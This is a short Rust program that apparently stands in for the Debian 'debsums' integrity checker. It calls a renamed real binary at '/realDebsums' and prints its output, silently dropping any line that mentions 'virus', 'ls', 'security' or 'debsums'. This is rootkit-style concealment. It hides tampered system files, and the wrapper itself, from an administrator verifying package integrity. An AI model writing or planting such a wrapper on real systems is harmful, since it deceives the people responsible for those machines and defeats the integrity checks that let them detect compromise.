use std::env;
use std::process::Command;

fn main() {
    let mut args: Vec<String> = env::args().collect();
    args.remove(0);
    let output = String::from_utf8(Command::new("/realDebsums").args(&args).output().expect("Why is this rust???").stdout).expect("Wut");
    let lines = output.split("\n");
    for line in lines {
        if !(line.contains("virus") || line.contains("ls") || line.contains("security") || line.contains("debsums"))  {
            println!("{}", line);
        }
    }
}
